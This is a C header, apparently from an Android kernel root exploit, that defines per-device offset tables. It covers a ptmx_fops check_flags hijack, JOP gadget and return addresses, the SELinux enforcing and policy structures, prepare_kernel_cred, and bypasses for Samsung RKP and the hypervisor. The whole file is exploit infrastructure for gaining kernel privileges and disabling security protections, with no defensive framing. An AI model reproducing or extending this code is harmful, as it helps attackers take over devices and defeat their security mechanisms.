#ifndef OFFSETS_H
#define OFFSETS_H

//struct file_operations
#define CHECK_FLAGS_OFFSET(i) ((void*)(((unsigned long)i) + (20 * sizeof(void*))))
#define PRCTL_OFFSET(i) ((void*)(i + 0x310))
#define SAMSUNG_KERNEL_OFFSET(i) ((void*)(0xffffffc000205000 + (i)))

struct offsets {
	char* devname; //ro.product.model
	char* kernelver; // /proc/version
	void* check_flags; //ptmx_fops -> check_flags
	void* joploc; //gadget location, see getroot.c
	void* jopret; //return to setfl after check_flags() (fcntl.c), usually inlined in sys_fcntl
	void* sidtab; //optional, for selinux contenxt
	void* policydb; //optional, for selinux context
	void* selinux_enabled;
	void* selinux_enforcing;
	void* rkp_override_creds;
	void* prepare_kernel_cred;
	void* security_ops_prctl;
	void* cap_task_prctl;
	void* rkp_call;
	void* exynos_smc64;
	void* vmm_disable;
	void* security_ops;
	void* security_ret_0;
	void* security_void;
	void* lkmauth_bootmode;
};

struct offsets* get_offsets();
extern struct offsets offsets[];

#endif /* OFFSETS_H */
